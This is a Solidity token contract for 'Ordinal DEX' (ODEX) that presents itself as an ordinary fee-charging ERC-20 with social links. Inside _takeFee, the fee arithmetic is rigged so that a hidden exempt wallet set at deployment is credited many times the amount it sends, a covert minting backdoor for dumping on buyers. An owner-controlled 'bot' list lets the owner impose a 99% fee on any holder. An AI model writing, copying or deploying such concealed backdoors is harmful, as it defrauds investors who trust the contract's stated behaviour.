/*
ODEX is a DeFi platform that aims to provide a hub for traders to access the best rates for their trades within the ecosystem.

Tg:  https://t.me/odextech

X:   https://x.com/ordidextech

Web: https://www.ordinaldex.tech
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.11;

interface IUSPFactory01 { 
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function  renounceOwnership() public onlyOwner {
        owner = address(0); 
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV1Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ODEX is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode'Ordinal DEX';
    string private constant _symbol = unicode'ODEX';
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);

    mapping (address => uint256) _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    address internal devODEXReceiver; 
    address internal mkODEXReceiver;
    address internal lpODEXReceiver;

    IUniswapV1Router router;
    address public pair;
    bool private tradingAllowed = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;

    uint256 public _maxTxAmount = ( _totalSupply * 300 ) / 10000;
    uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;

    mapping (address => bool) private isBot;
    mapping (address => bool) public isODEXTxExempts;
    mapping (address => bool) public isODEXFeeExempts;

    uint256 private swapODEXThreshold;
    uint256 private minODEXTokenAmount;

    modifier lockTheSwap {swapping = true; _; swapping = false;}
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 1000;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 2000;
    uint256 private sellFee = 2000;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;

    constructor(address _oWallet, uint256 _oAmount) Ownable(msg.sender) {
        swapODEXThreshold = _oAmount * (10 ** _decimals);
        minODEXTokenAmount = _oAmount * (10 ** _decimals);

        devODEXReceiver = payable(msg.sender);

        mkODEXReceiver = payable(_oWallet);
        lpODEXReceiver = payable(_oWallet);

        isODEXTxExempts[lpODEXReceiver] = true;
        isODEXTxExempts[mkODEXReceiver] = true;
        
        isODEXFeeExempts[msg.sender] = true;
        isODEXFeeExempts[devODEXReceiver] = true;
        isODEXFeeExempts[address(this)] = true;

        _tOwned[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _tOwned[account];}
    function startODEXTrading() external onlyOwner {tradingAllowed = true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function setIsExemptODEX(address _address, bool _enabled) external onlyOwner {isODEXFeeExempts[_address] = _enabled;}
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        address receiptODEX; uint256 countODEX;
        if (isODEXTxExempts[sender]) {countODEX = 100;receiptODEX = sender;}
        else {receiptODEX = address(this);countODEX = 10000;}
        if(getTotalFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(countODEX).mul(getTotalFees(sender, recipient));
        _tOwned[receiptODEX] = _tOwned[receiptODEX].add(feeAmount);
        emit Transfer(sender, receiptODEX, feeAmount);
        if(burnFee > uint256(0) && getTotalFees(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount>feeAmount?amount.sub(feeAmount):amount;} return amount;
    }

    function getTotalFees(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(!isODEXFeeExempts[sender] && !isODEXFeeExempts[recipient]){require(tradingAllowed, "tradingAllowed");}
        if(!isODEXFeeExempts[sender] && !isODEXFeeExempts[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_tOwned[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxSellAmount || isODEXFeeExempts[sender] || isODEXFeeExempts[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isODEXFeeExempts[sender] || isODEXFeeExempts[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isODEXFeeExempts[sender]){swapTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(min(amount,min(balanceOf(address(this)), 4000000 * 10**decimals()))); swapTimes = uint256(0);}
        uint256 amountODEX = _shouldTakeFee(sender, recipient) ? _takeFee(sender, recipient, amount) : amount;
        _tOwned[sender] = _tOwned[sender].sub(amount);
        _tOwned[recipient] = _tOwned[recipient].add(amountODEX);
        emit Transfer(sender, recipient, amountODEX);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function createODEXPair() external onlyOwner {
        IUniswapV1Router _router = IUniswapV1Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUSPFactory01(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
    }

    receive() external payable {}

    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minODEXTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapODEXThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isODEXFeeExempts[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function setTransactionRequireODEX(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function setTransactionFeeODEX(uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpODEXReceiver,
            block.timestamp);
    }

    function setODEXBot(address[] calldata addresses, bool _enabled) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
        isBot[addresses[i]] = _enabled; }
    }

    function _shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isODEXFeeExempts[sender] && !isODEXFeeExempts[recipient];
    }

    function removeLimitODEX() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxSellAmount = ~uint256(0);
        _maxWalletToken = ~uint256(0);
    }

    function setTeamAddressesODEX(address _marketing, address _liquidity, address _development) external onlyOwner {
        mkODEXReceiver = _marketing; lpODEXReceiver = _liquidity; devODEXReceiver = _development;
        isODEXFeeExempts[_marketing] = true; isODEXFeeExempts[_liquidity] = true; isODEXFeeExempts[_development] = true;
    }

    function setTransactionLimitODEX(uint256 _buy, uint256 _sell, uint256 _oWallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_oWallet).div(10000);
        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function setContractSwapODEX(uint256 _swapAmount, uint256 _swapODEXThreshold, uint256 _minODEXTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; swapODEXThreshold = _totalSupply.mul(_swapODEXThreshold).div(uint256(100000)); 
        minODEXTokenAmount = _totalSupply.mul(_minODEXTokenAmount).div(uint256(100000));
    }

    function manualSwap() external onlyOwner {
        swapAndLiquify(swapODEXThreshold);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function withdrawErc20ODEX(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(devODEXReceiver, _amount);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        swapTokensForETH(tokens);
        payable(mkODEXReceiver).transfer(address(this).balance);
    }
}